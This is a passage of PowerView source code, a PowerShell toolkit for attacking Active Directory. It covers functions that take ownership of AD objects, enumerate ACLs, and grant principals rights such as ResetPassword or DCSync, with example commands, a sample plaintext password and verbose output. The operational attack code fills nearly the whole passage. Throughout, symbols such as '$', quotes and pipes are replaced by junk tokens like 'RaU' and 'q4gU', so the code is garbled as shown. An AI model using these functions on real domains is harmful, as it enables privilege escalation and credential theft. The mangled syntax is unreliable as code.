            if (-not RaUPrincipal) {
                throw Oj8XUnable to resolve principal: RaUPrincipalIdentityOj8X
            }
            elseif(RaUPrincipal.Count -gt 1) {
                throw Oj8XPrincipalIdentity matches multiple AD objects, but only one is allowedOj8X
            }
            RaUObjectSid = RaUPrincipal.objectsid
        }
        else {
            RaUObjectSid = RaUPrincipalIdentity
        }

        RaUADRight = 0
        foreach(RaUr in RaURight) {
            RaUADRight = RaUADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]RaUr).value__)
        }
        RaUADRight = [System.DirectoryServices.ActiveDirectoryRights]RaUADRight

        RaUIdentity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]RaUObjectSid)
    }

    Process {
        if(RaUPSCmdlet.ParameterSetName -eq q4gUAuditRuleTypeq4gU) {

            if(RaUObjectType -eq RaUnull -and RaUInheritanceType -eq [String]::Empty -and RaUInheritedObjectType -eq RaUnull) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList RaUIdentity, RaUADRight, RaUAuditFlag
            } elseif(RaUObjectType -eq RaUnull -and RaUInheritanceType -ne [String]::Empty -and RaUInheritedObjectType -eq RaUnull) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList RaUIdentity, RaUADRight, RaUAuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]RaUInheritanceType)
            } elseif(RaUObjectType -eq RaUnull -and RaUInheritanceType -ne [String]::Empty -and RaUInheritedObjectType -ne RaUnull) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList RaUIdentity, RaUADRight, RaUAuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]RaUInheritanceType), RaUInheritedObjectType
            } elseif(RaUObjectType -ne RaUnull -and RaUInheritanceType -eq [String]::Empty -and RaUInheritedObjectType -eq RaUnull) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList RaUIdentity, RaUADRight, RaUAuditFlag, RaUObjectType
            } elseif(RaUObjectType -ne RaUnull -and RaUInheritanceType -ne [String]::Empty -and RaUInheritedObjectType -eq RaUnull) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList RaUIdentity, RaUADRight, RaUAuditFlag, RaUObjectType, RaUInheritanceType
            } elseif(RaUObjectType -ne RaUnull -and RaUInheritanceType -ne [String]::Empty -and RaUInheritedObjectType -ne RaUnull) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList RaUIdentity, RaUADRight, RaUAuditFlag, RaUObjectType, RaUInheritanceType, RaUInheritedObjectType
            }

        }
        else {

            if(RaUObjectType -eq RaUnull -and RaUInheritanceType -eq [String]::Empty -and RaUInheritedObjectType -eq RaUnull) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList RaUIdentity, RaUADRight, RaUAccessControlType
            } elseif(RaUObjectType -eq RaUnull -and RaUInheritanceType -ne [String]::Empty -and RaUInheritedObjectType -eq RaUnull) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList RaUIdentity, RaUADRight, RaUAccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]RaUInheritanceType)
            } elseif(RaUObjectType -eq RaUnull -and RaUInheritanceType -ne [String]::Empty -and RaUInheritedObjectType -ne RaUnull) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList RaUIdentity, RaUADRight, RaUAccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]RaUInheritanceType), RaUInheritedObjectType
            } elseif(RaUObjectType -ne RaUnull -and RaUInheritanceType -eq [String]::Empty -and RaUInheritedObjectType -eq RaUnull) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList RaUIdentity, RaUADRight, RaUAccessControlType, RaUObjectType
            } elseif(RaUObjectType -ne RaUnull -and RaUInheritanceType -ne [String]::Empty -and RaUInheritedObjectType -eq RaUnull) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList RaUIdentity, RaUADRight, RaUAccessControlType, RaUObjectType, RaUInheritanceType
            } elseif(RaUObjectType -ne RaUnull -and RaUInheritanceType -ne [String]::Empty -and RaUInheritedObjectType -ne RaUnull) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList RaUIdentity, RaUADRight, RaUAccessControlType, RaUObjectType, RaUInheritanceType, RaUInheritedObjectType
            }

        }
    }
}


function Set-DomainObjectOwner {
<#
.SYNOPSIS

Modifies the owner for a specified active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

Retrieves the Active Directory object specified by -Identity by splatting to
Get-DomainObject, returning the raw searchresult object. Retrieves the raw
directoryentry for the object, and sets the object owner to -OwnerIdentity.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
of the AD object to set the owner for.

.PARAMETER OwnerIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
of the owner to set for -Identity.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y

Set the owner of q4gUdfmq4gU in the current domain to q4gUharmj0yq4gU.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y -Credential RaUCred

Set the owner of q4gUdfmq4gU in the current domain to q4gUharmj0yq4gU using the alternate credentials.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseShouldProcessForStateChangingFunctionsq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU)]
        [String]
        RaUIdentity,

        [Parameter(Mandatory = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUOwnerq4gU)]
        [String]
        RaUOwnerIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUSearcherArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) { RaUSearcherArguments[q4gULDAPFilterq4gU] = RaULDAPFilter }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUOwnerSid = Get-DomainObject @SearcherArguments -Identity RaUOwnerIdentity -Properties objectsid wZ5t Select-Object -ExpandProperty objectsid
        if (RaUOwnerSid) {
            RaUOwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]RaUOwnerSid
        }
        else {
            Write-Warning Oj8X[Set-DomainObjectOwner] Error parsing owner identity q4gURaUOwnerIdentityq4gUOj8X
        }
    }

    PROCESS {
        if (RaUOwnerIdentityReference) {
            RaUSearcherArguments[q4gURawq4gU] = RaUTrue
            RaUSearcherArguments[q4gUIdentityq4gU] = RaUIdentity

            # splat the appropriate arguments to Get-DomainObject
            RaURawObject = Get-DomainObject @SearcherArguments

            ForEach (RaUObject in RaURawObject) {
                try {
                    Write-Verbose Oj8X[Set-DomainObjectOwner] Attempting to set the owner for q4gURaUIdentityq4gU to q4gURaUOwnerIdentityq4gUOj8X
                    RaUEntry = RaURawObject.GetDirectoryEntry()
                    RaUEntry.PsBase.Options.SecurityMasks = q4gUOwnerq4gU
                    RaUEntry.PsBase.ObjectSecurity.SetOwner(RaUOwnerIdentityReference)
                    RaUEntry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning Oj8X[Set-DomainObjectOwner] Error setting owner: RaU_Oj8X
                }
            }
        }
    }
}


function Get-DomainObjectAcl {
<#
.SYNOPSIS

Returns the ACLs associated with a specific active directory object. By default
the DACL for the object(s) is returned, but the SACL can be returned with -Sacl.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainGUIDMap  

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Sacl

Switch. Return the SACL instead of the DACL for the object (default behavior).

.PARAMETER ResolveGUIDs

Switch. Resolve GUIDs to their display names.

.PARAMETER RightsFilter

A specific set of rights to return (q4gUAllq4gU, q4gUResetPasswordq4gU, q4gUWriteMembersq4gU).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectAcl -Identity matt.admin -domain testlab.local -ResolveGUIDs

Get the ACLs for the matt.admin user in the testlab.local domain and
resolve relevant GUIDs to their display names.

.EXAMPLE

Get-DomainOU wZ5t Get-DomainObjectAcl -ResolveGUIDs

Enumerate the ACL permissions for all OUs in the domain.

.EXAMPLE

Get-DomainOU wZ5t Get-DomainObjectAcl -ResolveGUIDs -Sacl

Enumerate the SACLs for all OUs in the domain, resolving GUIDs.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainObjectAcl -Credential RaUCred -ResolveGUIDs

.OUTPUTS

PowerView.ACL

Custom PSObject with ACL entries.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.ACLq4gU)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU)]
        [String[]]
        RaUIdentity,

        [Switch]
        RaUSacl,

        [Switch]
        RaUResolveGUIDs,

        [String]
        [Alias(q4gURightsq4gU)]
        [ValidateSet(q4gUAllq4gU, q4gUResetPasswordq4gU, q4gUWriteMembersq4gU)]
        RaURightsFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUsamaccountname,ntsecuritydescriptor,distinguishedname,objectsidq4gU
        }

        if (RaUPSBoundParameters[q4gUSaclq4gU]) {
            RaUSearcherArguments[q4gUSecurityMasksq4gU] = q4gUSaclq4gU
        }
        else {
            RaUSearcherArguments[q4gUSecurityMasksq4gU] = q4gUDaclq4gU
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        RaUSearcher = Get-DomainSearcher @SearcherArguments

        RaUDomainGUIDMapArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUDomainGUIDMapArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUDomainGUIDMapArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUDomainGUIDMapArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUDomainGUIDMapArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUDomainGUIDMapArguments[q4gUCredentialq4gU] = RaUCredential }

        # get a GUID -> name mapping
        if (RaUPSBoundParameters[q4gUResolveGUIDsq4gU]) {
            RaUGUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if (RaUSearcher) {
            RaUIdentityFilter = q4gUq4gU
            RaUFilter = q4gUq4gU
            RaUIdentity wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                RaUIdentityInstance = RaU_.Replace(q4gU(q4gU, q4gUScKj28q4gU).Replace(q4gU)q4gU, q4gUScKj29q4gU)
                if (RaUIdentityInstance -match q4gU^S-1-.*q4gU) {
                    RaUIdentityFilter += Oj8X(objectsid=RaUIdentityInstance)Oj8X
                }
                elseif (RaUIdentityInstance -match q4gU^(CNwZ5tOUwZ5tDC)=.*q4gU) {
                    RaUIdentityFilter += Oj8X(distinguishedname=RaUIdentityInstance)Oj8X
                    if ((-not RaUPSBoundParameters[q4gUDomainq4gU]) -and (-not RaUPSBoundParameters[q4gUSearchBaseq4gU])) {
                        # if a -Domain isnq4gUt explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        RaUIdentityDomain = RaUIdentityInstance.SubString(RaUIdentityInstance.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                        Write-Verbose Oj8X[Get-DomainObjectAcl] Extracted domain q4gURaUIdentityDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                        RaUSearcherArguments[q4gUDomainq4gU] = RaUIdentityDomain
                        RaUSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not RaUSearcher) {
                            Write-Warning Oj8X[Get-DomainObjectAcl] Unable to retrieve domain searcher for q4gURaUIdentityDomainq4gUOj8X
                        }
                    }
                }
                elseif (RaUIdentityInstance -imatch q4gU^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}RaUq4gU) {
                    RaUGuidByteString = (([Guid]RaUIdentityInstance).ToByteArray() wZ5t ForEach-Object { q4gUScKjq4gU + RaU_.ToString(q4gUX2q4gU) }) -join q4gUq4gU
                    RaUIdentityFilter += Oj8X(objectguid=RaUGuidByteString)Oj8X
                }
                elseif (RaUIdentityInstance.Contains(q4gU.q4gU)) {
                    RaUIdentityFilter += Oj8X(wZ5t(samAccountName=RaUIdentityInstance)(name=RaUIdentityInstance)(dnshostname=RaUIdentityInstance))Oj8X
                }
                else {
                    RaUIdentityFilter += Oj8X(wZ5t(samAccountName=RaUIdentityInstance)(name=RaUIdentityInstance)(displayname=RaUIdentityInstance))Oj8X
                }
            }
            if (RaUIdentityFilter -and (RaUIdentityFilter.Trim() -ne q4gUq4gU) ) {
                RaUFilter += Oj8X(wZ5tRaUIdentityFilter)Oj8X
            }

            if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) {
                Write-Verbose Oj8X[Get-DomainObjectAcl] Using additional LDAP filter: RaULDAPFilterOj8X
                RaUFilter += Oj8XRaULDAPFilterOj8X
            }

            if (RaUFilter) {
                RaUSearcher.filter = Oj8X(&RaUFilter)Oj8X
            }
            Write-Verbose Oj8X[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: RaU(RaUSearcher.filter)Oj8X

            RaUResults = RaUSearcher.FindAll()
            RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                RaUObject = RaU_.Properties

                if (RaUObject.objectsid -and RaUObject.objectsid[0]) {
                    RaUObjectSid = (New-Object System.Security.Principal.SecurityIdentifier(RaUObject.objectsid[0],0)).Value
                }
                else {
                    RaUObjectSid = RaUNull
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList RaUObject[q4gUntsecuritydescriptorq4gU][0], 0 wZ5t ForEach-Object { if (RaUPSBoundParameters[q4gUSaclq4gU]) {RaU_.SystemAcl} else {RaU_.DiscretionaryAcl} } wZ5t ForEach-Object {
                        if (RaUPSBoundParameters[q4gURightsFilterq4gU]) {
                            RaUGuidFilter = Switch (RaURightsFilter) {
                                q4gUResetPasswordq4gU { q4gU00299570-246d-11d0-a768-00aa006e0529q4gU }
                                q4gUWriteMembersq4gU { q4gUbf9679c0-0de6-11d0-a285-00aa003049e2q4gU }
                                Default { q4gU00000000-0000-0000-0000-000000000000q4gU }
                            }
                            if (RaU_.ObjectType -eq RaUGuidFilter) {
                                RaU_ wZ5t Add-Member NoteProperty q4gUObjectDNq4gU RaUObject.distinguishedname[0]
                                RaU_ wZ5t Add-Member NoteProperty q4gUObjectSIDq4gU RaUObjectSid
                                RaUContinue = RaUTrue
                            }
                        }
                        else {
                            RaU_ wZ5t Add-Member NoteProperty q4gUObjectDNq4gU RaUObject.distinguishedname[0]
                            RaU_ wZ5t Add-Member NoteProperty q4gUObjectSIDq4gU RaUObjectSid
                            RaUContinue = RaUTrue
                        }

                        if (RaUContinue) {
                            RaU_ wZ5t Add-Member NoteProperty q4gUActiveDirectoryRightsq4gU ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], RaU_.AccessMask))
                            if (RaUGUIDs) {
                                # if weq4gUre resolving GUIDs, map them them to the resolved hash table
                                RaUAclProperties = @{}
                                RaU_.psobject.properties wZ5t ForEach-Object {
                                    if (RaU_.Name -match q4gUObjectTypewZ5tInheritedObjectTypewZ5tObjectAceTypewZ5tInheritedObjectAceTypeq4gU) {
                                        try {
                                            RaUAclProperties[RaU_.Name] = RaUGUIDs[RaU_.Value.toString()]
                                        }
                                        catch {
                                            RaUAclProperties[RaU_.Name] = RaU_.Value
                                        }
                                    }
                                    else {
                                        RaUAclProperties[RaU_.Name] = RaU_.Value
                                    }
                                }
                                RaUOutObject = New-Object -TypeName PSObject -Property RaUAclProperties
                                RaUOutObject.PSObject.TypeNames.Insert(0, q4gUPowerView.ACLq4gU)
                                RaUOutObject
                            }
                            else {
                                RaU_.PSObject.TypeNames.Insert(0, q4gUPowerView.ACLq4gU)
                                RaU_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose Oj8X[Get-DomainObjectAcl] Error: RaU_Oj8X
                }
            }
        }
    }
}


function Add-DomainObjectAcl {
<#
.SYNOPSIS

Adds an ACL for a specific active directory object.

AdminSDHolder ACL approach from Sean Metcalf (@pyrotek3): https://adsecurity.org/?p=1906

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

This function modifies the ACL/ACE entries for a given Active Directory
target object specified by -TargetIdentity. Available -Rights are
q4gUAllq4gU, q4gUResetPasswordq4gU, q4gUWriteMembersq4gU, q4gUDCSyncq4gU, or a manual extended
rights GUID can be set with -RightsGUID. These rights are granted on the target
object for the specified -PrincipalIdentity.

.PARAMETER TargetIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain object to modify ACLs for. Required. Wildcards accepted.

.PARAMETER TargetDomain

Specifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.

.PARAMETER TargetLDAPFilter

Specifies an LDAP query string that is used to filter Active Directory object targets.

.PARAMETER TargetSearchBase

The LDAP source to search through for targets, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Rights

Rights to add for the principal, q4gUAllq4gU, q4gUResetPasswordq4gU, q4gUWriteMembersq4gU, q4gUDCSyncq4gU.
Defaults to q4gUAllq4gU.

.PARAMETER RightsGUID

Manual GUID representing the right to add to the target.

.EXAMPLE

RaUHarmj0ySid = Get-DomainUser harmj0y wZ5t Select-Object -ExpandProperty objectsid
Get-DomainObjectACL dfm.a -ResolveGUIDs wZ5t Where-Object {RaU_.securityidentifier -eq RaUHarmj0ySid}

...

Add-DomainObjectAcl -TargetIdentity dfm.a -PrincipalIdentity harmj0y -Rights ResetPassword -Verbose
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(wZ5t(samAccountName=harmj0y)))
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:(&(wZ5t(samAccountName=dfm.a)))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local q4gUResetPasswordq4gU on CN=dfm (admin),CN=Users,DC=testlab,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID q4gU00299570-246d-11d0-a768-00aa006e0529q4gU on CN=dfm (admin),CN=Users,DC=testlab,DC=local

Get-DomainObjectACL dfm.a -ResolveGUIDs wZ5t Where-Object {RaU_.securityidentifier -eq RaUHarmj0ySid }

AceQualifier           : AccessAllowed
ObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

.EXAMPLE

RaUHarmj0ySid = Get-DomainUser harmj0y wZ5t Select-Object -ExpandProperty objectsid
Get-DomainObjectACL testuser -ResolveGUIDs wZ5t Where-Object {RaU_.securityidentifier -eq RaUHarmj0ySid}

[no results returned]

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU-AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Add-DomainObjectAcl -TargetIdentity testuser -PrincipalIdentity harmj0y -Rights ResetPassword -Credential RaUCred -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain q4gUTESTLABq4gU from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(wZ5t(wZ5t(samAccountName=harmj0y)(name=harmj0y))))
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain q4gUTESTLABq4gU from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(wZ5t(wZ5t(samAccountName=testuser)(name=testuser))))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local q4gUResetPasswordq4gU on CN=testuser testuser,CN=Users,DC=testlab,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID q4gU00299570-246d-11d0-a768-00aa006e0529q4gU on CN=testuser,CN=Users,DC=testlab,DC=local

Get-DomainObjectACL testuser -ResolveGUIDs wZ5t Where-Object {RaU_.securityidentifier -eq RaUHarmj0ySid }

AceQualifier           : AccessAllowed
ObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local
